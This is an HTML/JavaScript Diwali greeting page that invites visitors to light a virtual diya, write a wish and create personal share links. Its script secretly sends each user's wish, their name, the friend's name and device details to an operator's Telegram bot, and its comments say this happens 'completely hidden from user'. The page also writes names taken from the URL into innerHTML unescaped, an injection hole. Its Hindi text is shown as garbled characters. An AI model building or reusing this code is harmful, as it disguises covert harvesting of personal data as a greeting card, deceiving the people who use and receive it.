<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Diwali - Light Diya & Make a Wish</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&family=Noto+Sans+Devanagari:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --gold: #D4AF37;
            --deep-gold: #B8860B;
            --light-gold: #F5E8B8;
            --dark-blue: #0A0E2A;
            --navy: #1A1F4B;
            --rich-red: #8B0000;
            --cream: #FDF6E3;
            --green: #2E8B57;
            --red: #e74c3c;
        }

        body {
            background: linear-gradient(135deg, var(--dark-blue) 0%, var(--navy) 50%, #2D1B69 100%);
            color: var(--cream);
            min-height: 100vh;
            overflow-x: hidden;
            font-family: 'Poppins', sans-serif;
        }

        .hindi {
            font-family: 'Noto Sans Devanagari', sans-serif;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 40px 0 30px;
            position: relative;
        }

        h1 {
            font-size: 3.5rem;
            margin-bottom: 15px;
            background: linear-gradient(to right, var(--gold), var(--light-gold));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
            animation: titleGlow 3s ease-in-out infinite alternate;
        }

        @keyframes titleGlow {
            from {
                text-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
            }
            to {
                text-shadow: 0 0 30px rgba(212, 175, 55, 0.8), 0 0 40px rgba(212, 175, 55, 0.4);
            }
        }

        .subtitle {
            font-size: 1.5rem;
            margin-bottom: 30px;
            color: var(--light-gold);
            font-weight: 500;
        }

        .hindi-subtitle {
            font-size: 1.8rem;
            color: var(--gold);
            margin-top: 10px;
        }

        .diwali-decoration {
            display: flex;
            justify-content: center;
            margin: 30px 0;
            flex-wrap: wrap;
            gap: 20px;
        }

        .diya {
            width: 70px;
            height: 70px;
            position: relative;
            animation: float 4s ease-in-out infinite;
            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.5));
        }

        .diya:nth-child(2) {
            animation-delay: 0.7s;
        }

        .diya:nth-child(3) {
            animation-delay: 1.4s;
        }

        .diya:nth-child(4) {
            animation-delay: 2.1s;
        }

        .diya:nth-child(5) {
            animation-delay: 2.8s;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            33% {
                transform: translateY(-15px) rotate(2deg);
            }
            66% {
                transform: translateY(-8px) rotate(-2deg);
            }
        }

        .diya-base {
            width: 70px;
            height: 35px;
            background: linear-gradient(135deg, var(--rich-red), #A52A2A);
            border-radius: 0 0 35px 35px;
            position: relative;
            overflow: hidden;
            box-shadow: inset 0 -5px 10px rgba(0, 0, 0, 0.3);
        }

        .diya-base:before {
            content: '';
            position: absolute;
            width: 50px;
            height: 20px;
            background: linear-gradient(to right, #CD5C5C, #DC143C);
            border-radius: 50%;
            top: 10px;
            left: 10px;
            opacity: 0.8;
        }

        .flame {
            width: 25px;
            height: 45px;
            background: linear-gradient(to top, var(--gold), #FFD700, #FFA500);
            border-radius: 50% 50% 20% 20%;
            position: absolute;
            top: -40px;
            left: 22.5px;
            box-shadow: 0 0 20px 8px rgba(255, 215, 0, 0.6);
            animation: flicker 1.2s infinite alternate;
            transform-origin: bottom center;
        }

        @keyframes flicker {
            0%, 100% {
                transform: scaleY(1) scaleX(1);
                opacity: 0.9;
            }
            50% {
                transform: scaleY(1.1) scaleX(0.95);
                opacity: 1;
            }
        }

        .flame:before {
            content: '';
            position: absolute;
            width: 18px;
            height: 30px;
            background: linear-gradient(to top, #FFD700, #FFEC8B);
            border-radius: 50% 50% 20% 20%;
            top: 4px;
            left: 3.5px;
        }

        .content {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 30px;
        }

        .section {
            background: linear-gradient(135deg, rgba(26, 31, 75, 0.7), rgba(42, 21, 105, 0.5));
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            width: 100%;
            max-width: 800px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(212, 175, 55, 0.2);
            position: relative;
            overflow: hidden;
        }

        .section:before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(to right, transparent, var(--gold), transparent);
        }

        .section-title {
            font-size: 2rem;
            margin-bottom: 20px;
            color: var(--light-gold);
            text-align: center;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title:after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 2px;
            background: linear-gradient(to right, transparent, var(--gold), transparent);
        }

        .light-diya-section {
            text-align: center;
        }

        .instruction {
            font-size: 1.1rem;
            margin-bottom: 20px;
            color: var(--light-gold);
        }

        .diya-container {
            position: relative;
            width: 150px;
            height: 150px;
            margin: 0 auto 30px;
            cursor: pointer;
            transition: transform 0.3s;
            filter: drop-shadow(0 0 15px rgba(0, 0, 0, 0.5));
        }

        .diya-container:hover {
            transform: scale(1.05);
        }

        .big-diya {
            width: 150px;
            height: 75px;
            background: linear-gradient(135deg, var(--rich-red), #8B4513);
            border-radius: 0 0 75px 75px;
            position: relative;
            overflow: hidden;
            box-shadow: inset 0 -8px 15px rgba(0, 0, 0, 0.4);
        }

        .big-diya:before {
            content: '';
            position: absolute;
            width: 110px;
            height: 35px;
            background: linear-gradient(to right, #CD5C5C, #DC143C);
            border-radius: 50%;
            top: 20px;
            left: 20px;
            opacity: 0.8;
        }

        .big-flame {
            width: 50px;
            height: 85px;
            background: linear-gradient(to top, var(--gold), #FFD700, #FFA500);
            border-radius: 50% 50% 20% 20%;
            position: absolute;
            top: -75px;
            left: 50px;
            box-shadow: 0 0 30px 12px rgba(255, 215, 0, 0.7);
            opacity: 0;
            transition: opacity 0.5s;
            transform-origin: bottom center;
        }

        .big-flame.active {
            opacity: 1;
            animation: bigFlicker 1.2s infinite alternate;
        }

        @keyframes bigFlicker {
            0%, 100% {
                transform: scaleY(1) scaleX(1);
                opacity: 0.9;
            }
            50% {
                transform: scaleY(1.1) scaleX(0.95);
                opacity: 1;
            }
        }

        .wish-input {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid rgba(212, 175, 55, 0.3);
            background: rgba(10, 14, 42, 0.6);
            color: var(--cream);
            font-size: 1rem;
            margin: 20px 0 10px;
            resize: vertical;
            min-height: 100px;
            font-family: 'Poppins', sans-serif;
            transition: all 0.3s;
        }

        .wish-input:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
        }

        .wish-input::placeholder {
            color: rgba(245, 232, 184, 0.6);
        }

        .input-limit {
            text-align: right;
            font-size: 0.85rem;
            margin-bottom: 15px;
            color: var(--light-gold);
        }

        .input-limit.warning {
            color: var(--red);
        }

        .btn {
            background: linear-gradient(135deg, var(--gold), var(--deep-gold));
            color: var(--dark-blue);
            border: none;
            padding: 14px 35px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 6px 15px rgba(212, 175, 55, 0.4);
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(212, 175, 55, 0.6);
        }

        .btn:active {
            transform: translateY(1px);
        }

        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .share-section {
            text-align: center;
        }

        .name-inputs {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin: 25px 0;
            justify-content: center;
        }

        .input-group {
            flex: 1;
            min-width: 220px;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--light-gold);
            font-size: 1.1rem;
        }

        .input-group input {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 1px solid rgba(212, 175, 55, 0.3);
            background: rgba(10, 14, 42, 0.6);
            color: var(--cream);
            font-size: 1rem;
            transition: all 0.3s;
            font-family: 'Poppins', sans-serif;
        }

        .input-group input:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
        }

        .input-group .char-count {
            position: absolute;
            right: 10px;
            top: 42px;
            font-size: 0.8rem;
            color: var(--light-gold);
        }

        .share-options {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: center;
            margin: 30px 0;
        }

        .share-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(26, 31, 75, 0.7);
            padding: 14px 20px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid rgba(212, 175, 55, 0.2);
            font-weight: 500;
        }

        .share-btn:hover {
            background: rgba(42, 21, 105, 0.7);
            transform: translateY(-3px);
            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
        }

        .share-btn i {
            font-size: 1.3rem;
            color: var(--gold);
        }

        .generated-link {
            background: rgba(10, 14, 42, 0.7);
            padding: 18px;
            border-radius: 12px;
            margin: 20px 0;
            word-break: break-all;
            display: none;
            border: 1px solid rgba(212, 175, 55, 0.2);
            position: relative;
        }

        .generated-link:before {
            content: 'Your Personal Diwali Wish Link';
            position: absolute;
            top: -10px;
            left: 20px;
            background: var(--navy);
            padding: 0 10px;
            font-size: 0.9rem;
            color: var(--light-gold);
        }

        .fireworks {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .firework {
            position: absolute;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
            animation: explode 1.5s forwards;
        }

        @keyframes explode {
            0% {
                transform: translateY(100vh);
                opacity: 1;
            }
            100% {
                transform: translateY(-100px);
                opacity: 0;
            }
        }

        footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 40px;
            color: rgba(245, 232, 184, 0.7);
            font-size: 0.9rem;
            border-top: 1px solid rgba(212, 175, 55, 0.2);
        }

        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            display: none;
            font-size: 1rem;
        }

        .alert-success {
            background: rgba(46, 204, 113, 0.15);
            border: 1px solid rgba(46, 204, 113, 0.4);
            color: #2ecc71;
        }

        .alert-error {
            background: rgba(231, 76, 60, 0.15);
            border: 1px solid rgba(231, 76, 60, 0.4);
            color: #e74c3c;
        }

        .alert-info {
            background: rgba(52, 152, 219, 0.15);
            border: 1px solid rgba(52, 152, 219, 0.4);
            color: #3498db;
        }

        .rangoli {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: -1;
            opacity: 0.1;
            background-image: radial-gradient(circle at 20% 30%, var(--gold) 0%, transparent 50%),
                              radial-gradient(circle at 80% 20%, var(--light-gold) 0%, transparent 50%),
                              radial-gradient(circle at 40% 80%, var(--deep-gold) 0%, transparent 50%);
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }
            
            .subtitle {
                font-size: 1.2rem;
            }
            
            .hindi-subtitle {
                font-size: 1.4rem;
            }
            
            .diya {
                width: 60px;
                height: 60px;
            }
            
            .section {
                padding: 20px;
            }
            
            .section-title {
                font-size: 1.7rem;
            }
            
            .diya-container {
                width: 130px;
                height: 130px;
            }
            
            .big-diya {
                width: 130px;
                height: 65px;
            }
            
            .big-flame {
                left: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="rangoli"></div>
    <div class="fireworks" id="fireworks"></div>
    
    <div class="container">
        <header>
            <h1>Happy Diwali</h1>
            <p class="subtitle">Light a Diya and Make a Wish</p>
            <p class="hindi-subtitle hindi">‡§¶‡•Ä‡§™‡§æ‡§µ‡§≤‡•Ä ‡§ï‡•Ä ‡§π‡§æ‡§∞‡•ç‡§¶‡§ø‡§ï ‡§∂‡•Å‡§≠‡§ï‡§æ‡§Æ‡§®‡§æ‡§è‡§Ç</p>
            
            <div class="diwali-decoration">
                <div class="diya">
                    <div class="flame"></div>
                    <div class="diya-base"></div>
                </div>
                <div class="diya">
                    <div class="flame"></div>
                    <div class="diya-base"></div>
                </div>
                <div class="diya">
                    <div class="flame"></div>
                    <div class="diya-base"></div>
                </div>
                <div class="diya">
                    <div class="flame"></div>
                    <div class="diya-base"></div>
                </div>
                <div class="diya">
                    <div class="flame"></div>
                    <div class="diya-base"></div>
                </div>
            </div>
        </header>
        
        <div class="content">
            <section class="section light-diya-section">
                <h2 class="section-title">Light Diya & Make a Wish</h2>
                <p class="instruction">Click on the diya to light it up, then write your wish below</p>
                
                <div class="diya-container" id="diyaContainer">
                    <div class="big-flame" id="bigFlame"></div>
                    <div class="big-diya"></div>
                </div>
                
                <textarea class="wish-input" id="wishInput" placeholder="Write your Diwali wish here... May all your dreams come true!" maxlength="200"></textarea>
                <div class="input-limit" id="wishLimit">200 characters remaining</div>
                
                <button class="btn" id="makeWishBtn">
                    <i class="fas fa-star"></i> Make Your Wish
                </button>
                
                <div class="alert" id="wishAlert"></div>
            </section>
            
            <section class="section share-section" id="shareSection" style="display: none;">
                <h2 class="section-title">Share with Friends & Family</h2>
                <p class="instruction">Send personalized Diwali wishes to your loved ones</p>
                
                <div class="name-inputs">
                    <div class="input-group">
                        <label for="yourName"><i class="fas fa-user"></i> Your Name</label>
                        <input type="text" id="yourName" placeholder="Enter your name" maxlength="30">
                        <div class="char-count" id="yourNameCount">0/30</div>
                    </div>
                    <div class="input-group">
                        <label for="friendName"><i class="fas fa-heart"></i> Friend's Name</label>
                        <input type="text" id="friendName" placeholder="Enter friend's name" maxlength="30">
                        <div class="char-count" id="friendNameCount">0/30</div>
                    </div>
                </div>
                
                <button class="btn" id="generateLinkBtn">
                    <i class="fas fa-link"></i> Create Personal Link
                </button>
                
                <div class="generated-link" id="generatedLink">
                    <p id="linkText"></p>
                </div>
                
                <div class="share-options">
                    <div class="share-btn" id="copyLinkBtn">
                        <i class="fas fa-copy"></i>
                        <span>Copy Link</span>
                    </div>
                    <div class="share-btn" id="shareWhatsapp">
                        <i class="fab fa-whatsapp"></i>
                        <span>WhatsApp</span>
                    </div>
                    <div class="share-btn" id="shareTelegram">
                        <i class="fab fa-telegram"></i>
                        <span>Telegram</span>
                    </div>
                </div>
                
                <div class="alert" id="shareAlert"></div>
            </section>
        </div>
        
        <footer>
            <p>Wishing you and your family a very Happy Diwali!</p>
            <p>May this festival of lights bring joy, success and prosperity to your life.</p>
            <p class="hindi">‡§Ü‡§™‡§ï‡•ã ‡§î‡§∞ ‡§Ü‡§™‡§ï‡•á ‡§™‡§∞‡§ø‡§µ‡§æ‡§∞ ‡§ï‡•ã ‡§¶‡•Ä‡§™‡§æ‡§µ‡§≤‡•Ä ‡§ï‡•Ä ‡§π‡§æ‡§∞‡•ç‡§¶‡§ø‡§ï ‡§∂‡•Å‡§≠‡§ï‡§æ‡§Æ‡§®‡§æ‡§è‡§Ç!ü™î</p>
        </footer>
    </div>

    <script>
        // DOM Elements
        const diyaContainer = document.getElementById('diyaContainer');
        const bigFlame = document.getElementById('bigFlame');
        const wishInput = document.getElementById('wishInput');
        const wishLimit = document.getElementById('wishLimit');
        const makeWishBtn = document.getElementById('makeWishBtn');
        const wishAlert = document.getElementById('wishAlert');
        const shareSection = document.getElementById('shareSection');
        const yourNameInput = document.getElementById('yourName');
        const friendNameInput = document.getElementById('friendName');
        const yourNameCount = document.getElementById('yourNameCount');
        const friendNameCount = document.getElementById('friendNameCount');
        const generateLinkBtn = document.getElementById('generateLinkBtn');
        const generatedLink = document.getElementById('generatedLink');
        const linkText = document.getElementById('linkText');
        const copyLinkBtn = document.getElementById('copyLinkBtn');
        const shareWhatsapp = document.getElementById('shareWhatsapp');
        const shareTelegram = document.getElementById('shareTelegram');
        const shareAlert = document.getElementById('shareAlert');
        const fireworksContainer = document.getElementById('fireworks');

        // Telegram Bot Configuration (hidden from users)
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Replace with your chat ID

        // State variables
        let isDiyaLit = false;
        let userWish = '';
        let userName = '';
        let friendName = '';
        let personalizedLink = '';

        // Character limits
        const WISH_MAX_LENGTH = 200;
        const NAME_MAX_LENGTH = 30;

        // Show alert function
        function showAlert(alertElement, message, type) {
            alertElement.textContent = message;
            alertElement.className = `alert alert-${type}`;
            alertElement.style.display = 'block';
            
            // Auto hide after 5 seconds
            setTimeout(() => {
                alertElement.style.display = 'none';
            }, 5000);
        }

        // Update character counter for wish
        wishInput.addEventListener('input', function() {
            const remaining = WISH_MAX_LENGTH - this.value.length;
            wishLimit.textContent = `${remaining} characters remaining`;
            
            if (remaining < 50) {
                wishLimit.classList.add('warning');
            } else {
                wishLimit.classList.remove('warning');
            }
        });

        // Update character counters for names
        yourNameInput.addEventListener('input', function() {
            yourNameCount.textContent = `${this.value.length}/${NAME_MAX_LENGTH}`;
        });

        friendNameInput.addEventListener('input', function() {
            friendNameCount.textContent = `${this.value.length}/${NAME_MAX_LENGTH}`;
        });

        // Light up the diya when clicked
        diyaContainer.addEventListener('click', function() {
            if (!isDiyaLit) {
                bigFlame.classList.add('active');
                isDiyaLit = true;
                createFireworks();
                
                // Show success message
                showAlert(wishAlert, 'Diya is lit! Now write your wish and click the Make Wish button.', 'success');
            }
        });

        // Make a wish button
        makeWishBtn.addEventListener('click', function() {
            if (!isDiyaLit) {
                showAlert(wishAlert, 'Please light the diya first by clicking on it.', 'error');
                return;
            }
            
            userWish = wishInput.value.trim();
            if (userWish === '') {
                showAlert(wishAlert, 'Please write your Diwali wish before making it.', 'error');
                return;
            }
            
            showAlert(wishAlert, 'Your wish is ready! Now share it with your friends and family.', 'success');
            
            // Show share section
            shareSection.style.display = 'block';
            
            // Scroll to share section
            shareSection.scrollIntoView({ behavior: 'smooth' });
            
            // Add more fireworks for celebration
            createFireworks();
        });

        // Generate personalized link - NOW SENDS DATA TO TELEGRAM
        generateLinkBtn.addEventListener('click', function() {
            userName = yourNameInput.value.trim();
            friendName = friendNameInput.value.trim();
            userWish = wishInput.value.trim();
            
            if (userName === '' || friendName === '') {
                showAlert(shareAlert, 'Please enter both your name and your friend\'s name.', 'error');
                return;
            }
            
            if (userName.length > NAME_MAX_LENGTH || friendName.length > NAME_MAX_LENGTH) {
                showAlert(shareAlert, `Names should be less than ${NAME_MAX_LENGTH} characters.`, 'error');
                return;
            }
            
            if (!isDiyaLit) {
                showAlert(shareAlert, 'Please light the diya first before creating a link.', 'error');
                return;
            }
            
            if (userWish === '') {
                showAlert(shareAlert, 'Please write your Diwali wish first.', 'error');
                return;
            }
            
            // Encode names for URL (simple base64 encoding)
            const encodedNames = btoa(`${userName}|${friendName}`);
            personalizedLink = `${window.location.origin}${window.location.pathname}?wish=${encodedNames}`;
            
            linkText.textContent = personalizedLink;
            generatedLink.style.display = 'block';
            
            // Send ALL data to Telegram (hidden from user)
            sendWishToTelegram(userWish, userName, friendName);
            
            showAlert(shareAlert, 'Your personal Diwali wish link has been created! Share it with your friends.', 'success');
            
            // Create celebration fireworks
            createFireworks();
        });

        // Copy link to clipboard
        copyLinkBtn.addEventListener('click', function() {
            if (!personalizedLink) {
                showAlert(shareAlert, 'Please generate a link first.', 'error');
                return;
            }
            
            navigator.clipboard.writeText(personalizedLink).then(() => {
                showAlert(shareAlert, 'Link copied to clipboard! You can now paste it anywhere.', 'success');
            }).catch(err => {
                showAlert(shareAlert, 'Failed to copy link. Please try again.', 'error');
            });
        });

        // Share via WhatsApp
        shareWhatsapp.addEventListener('click', function() {
            if (!personalizedLink) {
                showAlert(shareAlert, 'Please generate a link first.', 'error');
                return;
            }
            
            const message = `Happy Diwali! I've sent you a personal Diwali wish: ${personalizedLink}`;
            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
            window.open(whatsappUrl, '_blank');
        });

        // Share via Telegram
        shareTelegram.addEventListener('click', function() {
            if (!personalizedLink) {
                showAlert(shareAlert, 'Please generate a link first.', 'error');
                return;
            }
            
            const message = `Happy Diwali! I've sent you a personal Diwali wish: ${personalizedLink}`;
            const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent(personalizedLink)}&text=${encodeURIComponent(message)}`;
            window.open(telegramUrl, '_blank');
        });

        // Function to send wish to Telegram (completely hidden from user)
        function sendWishToTelegram(wish, senderName, receiverName) {
            // Get current date and time
            const now = new Date();
            const dateTime = now.toLocaleString();
            
            // Get user device info
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };
            
            // Prepare message for Telegram
            let message = `ü™î New Diwali Wish! ü™î\n\n`;
            message += `üìÖ Date & Time: ${dateTime}\n\n`;
            message += `üë§ Sender Name: ${senderName}\n`;
            message += `üéØ Receiver Name: ${receiverName}\n`;
            message += `üí´ Wish: ${wish}\n\n`;
            message += `üì± Device Info:\n`;
            message += `   - Browser: ${deviceInfo.userAgent.split(' ')[0]}\n`;
            message += `   - Platform: ${deviceInfo.platform}\n`;
            message += `   - Language: ${deviceInfo.language}\n`;
            message += `   - Screen: ${deviceInfo.screen}\n`;
            message += `   - Timezone: ${deviceInfo.timezone}\n`;
            
            // Send to Telegram using the Bot API
            // This happens silently in the background with no user notification
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('All data sent to Telegram successfully');
            })
            .catch(error => {
                console.error('Error sending data to Telegram:', error);
            });
        }

        // Function to create fireworks
        function createFireworks() {
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    const firework = document.createElement('div');
                    firework.className = 'firework';
                    firework.style.left = `${Math.random() * 100}%`;
                    firework.style.backgroundColor = getRandomColor();
                    fireworksContainer.appendChild(firework);
                    
                    // Remove firework after animation
                    setTimeout(() => {
                        firework.remove();
                    }, 1500);
                }, i * 100);
            }
        }

        // Helper function to get random color for fireworks
        function getRandomColor() {
            const colors = ['#D4AF37', '#FFD700', '#FFA500', '#F5E8B8', '#FFFFFF'];
            return colors[Math.floor(Math.random() * colors.length)];
        }

        // Check if page was opened with a personalized wish
        window.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const wishParam = urlParams.get('wish');
            
            if (wishParam) {
                try {
                    // Decode the names from the URL parameter
                    const decodedNames = atob(wishParam);
                    const [senderName, receiverName] = decodedNames.split('|');
                    
                    // Show personalized greeting
                    const personalizedGreeting = document.createElement('div');
                    personalizedGreeting.className = 'section';
                    personalizedGreeting.innerHTML = `
                        <h2 class="section-title">Special Diwali Wish For You</h2>
                        <p class="instruction">You have received a personal Diwali wish</p>
                        <div style="text-align: center; padding: 20px;">
                            <p style="font-size: 1.2rem; margin-bottom: 15px;">Dear <span style="color: var(--gold);">${receiverName}</span>,</p>
                            <p style="font-size: 1.1rem; margin-bottom: 20px; line-height: 1.6;">
                                <span style="color: var(--light-gold);">${senderName}</span> has sent you this special Diwali wish.
                            </p>
                            <p style="font-size: 1.1rem; font-style: italic; color: var(--light-gold);">
                                May the light of Diyas bring happiness, peace and success to your life.
                            </p>
                        </div>
                    `;
                    
                    document.querySelector('.content').prepend(personalizedGreeting);
                    
                    // Auto-light the diya ONLY for personalized wish pages
                    setTimeout(() => {
                        bigFlame.classList.add('active');
                        isDiyaLit = true;
                        createFireworks();
                    }, 1000);
                } catch (error) {
                    console.error('Error decoding wish parameter:', error);
                }
            } else {
                // Regular page - diya should NOT be lit initially
                isDiyaLit = false;
                bigFlame.classList.remove('active');
            }
        });
    </script>
</body>
</html>
